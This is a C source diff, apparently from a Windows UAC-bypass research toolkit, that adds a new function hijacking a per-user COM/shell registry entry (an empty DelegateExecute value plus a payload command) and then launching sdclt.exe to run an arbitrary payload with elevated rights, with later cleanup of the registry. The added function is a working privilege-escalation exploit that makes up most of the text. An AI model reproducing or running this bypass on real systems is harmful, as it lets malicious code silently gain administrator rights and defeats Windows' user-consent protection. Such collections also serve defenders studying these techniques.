@@ -1,12 +1,12 @@
 /*******************************************************************************
 *
-*  (C) COPYRIGHT AUTHORS, 2016 - 2018
+*  (C) COPYRIGHT AUTHORS, 2016 - 2019
 *
 *  TITLE:       ENIGMA0X3.C
 *
-*  VERSION:     3.11
+*  VERSION:     3.13
 *
-*  DATE:        23 Nov 2018
+*  DATE:        25 Jan 2019
 *
 *  Enigma0x3 autoelevation methods and everything based on the same
 *  ShellExecute related registry manipulations idea.
@@ -19,6 +19,7 @@
 *  https://enigma0x3.net/2017/03/14/bypassing-uac-using-app-paths/
 *  https://enigma0x3.net/2017/03/17/fileless-uac-bypass-using-sdclt-exe/
 *  https://winscripting.blog/2017/05/12/first-entry-welcome-and-uac-bypass/
+*  http://blog.sevagas.com/?Yet-another-sdclt-UAC-bypass
 *
 * THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
 * ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
@@ -452,7 +453,7 @@ BOOL ucmSdcltIsolatedCommandMethod(
     LPWSTR  lpTargetValue = NULL;
     HKEY    hKey = NULL;
 
-    WCHAR szBuffer[MAX_PATH + 1];
+    WCHAR szBuffer[MAX_PATH * 2];
     WCHAR szOldValue[MAX_PATH + 1];
 
 #ifndef _WIN64
@@ -562,7 +563,7 @@ BOOL ucmMsSettingsDelegateExecuteMethod(
 #endif
     HKEY    hKey = NULL;
 
-    WCHAR szTempBuffer[MAX_PATH + 1];
+    WCHAR szTempBuffer[MAX_PATH * 2];
 
     //
     // Trigger application doesn't exist in wow64.
@@ -635,6 +636,127 @@ BOOL ucmMsSettingsDelegateExecuteMethod(
             bResult = supRunProcess(szTempBuffer, NULL);
             supRegDeleteKeyRecursive(HKEY_CURRENT_USER, T_MSSETTINGS);
         }
+
+    } while (bCond);
+
+    if (hKey != NULL)
+        RegCloseKey(hKey);
+
+#ifndef _WIN64
+    if (g_ctx->IsWow64) {
+        RtlWow64EnableFsRedirectionEx(OldValue, &OldValue);
+    }
+#endif
+
+    return bResult;
+}
+
+/*
+* ucmSdcltDelegateExecuteCommandMethod
+*
+* Purpose:
+*
+* Bypass UAC abusing COM entry hijack.
+* Original author link: http://blog.sevagas.com/?Yet-another-sdclt-UAC-bypass
+*
+* Trigger: sdclt.exe without params
+*
+*/
+BOOL ucmSdcltDelegateExecuteCommandMethod(
+    _In_ LPWSTR lpszPayload
+)
+{
+    BOOL    bResult = FALSE, bCond = FALSE, bExist = FALSE;
+    DWORD   cbData, cbOldData = 0;
+    SIZE_T  sz = 0;
+    LRESULT lResult;
+#ifndef _WIN64
+    PVOID   OldValue;
+#endif
+    LPWSTR  lpTargetValue = TEXT("");
+    HKEY    hKey = NULL;
+
+    WCHAR szBuffer[MAX_PATH * 2];
+    WCHAR szOldValue[MAX_PATH + 1];
+
+#ifndef _WIN64
+    if (g_ctx->IsWow64) {
+        if (!NT_SUCCESS(RtlWow64EnableFsRedirectionEx((PVOID)TRUE, &OldValue)))
+            return FALSE;
+    }
+#endif
+
+    do {
+
+        sz = _strlen(lpszPayload);
+
+        _strcpy(szBuffer, T_CLASSESFOLDER);
+        _strcat(szBuffer, T_SHELL_OPEN_COMMAND);
+        lResult = RegCreateKeyEx(HKEY_CURRENT_USER, szBuffer, 0, NULL,
+            REG_OPTION_NON_VOLATILE, MAXIMUM_ALLOWED, NULL, &hKey, NULL);
+
+        if (lResult != ERROR_SUCCESS)
+            break;
+
+        //
+        // Save old value if exist.
+        //
+        cbOldData = MAX_PATH * 2;
+        RtlSecureZeroMemory(&szOldValue, sizeof(szOldValue));
+        lResult = RegQueryValueEx(hKey, lpTargetValue, 0, NULL,
+            (BYTE*)szOldValue, &cbOldData);
+        if (lResult == ERROR_SUCCESS)
+            bExist = TRUE;
+
+        //
+        // Set empty DelegateExecute value.
+        //
+        szBuffer[0] = 0;
+        cbData = 0;
+        lResult = RegSetValueEx(
+            hKey,
+            T_DELEGATEEXECUTE,
+            0, REG_SZ,
+            (BYTE*)szBuffer,
+            cbData);
+
+        if (lResult != ERROR_SUCCESS)
+            break;
+
+        cbData = (DWORD)((1 + sz) * sizeof(WCHAR));
+
+        lResult = RegSetValueEx(
+            hKey,
+            lpTargetValue,
+            0, REG_SZ,
+            (BYTE*)lpszPayload,
+            cbData);
+
+        if (lResult == ERROR_SUCCESS) {
+            _strcpy(szBuffer, g_ctx->szSystemDirectory);
+            _strcat(szBuffer, SDCLT_EXE);
+            bResult = supRunProcess(szBuffer, NULL);
+
+            Sleep(10000); //wait a bit until this shell shit complete it internals
+                          //not required if you don't cleanup or use reg.exe
+
+            if (bExist == FALSE) {
+                //
+                // We created this value, remove it.
+                //
+                RegDeleteValue(hKey, lpTargetValue);
+                
+            }
+            else {
+                //
+                // Value was before us, restore original.
+                //
+                RegSetValueEx(hKey, lpTargetValue, 0, REG_SZ,
+                    (BYTE*)szOldValue, cbOldData);
+            }
+        }
+
+        RegDeleteValue(hKey, T_DELEGATEEXECUTE);
 
     } while (bCond);
 
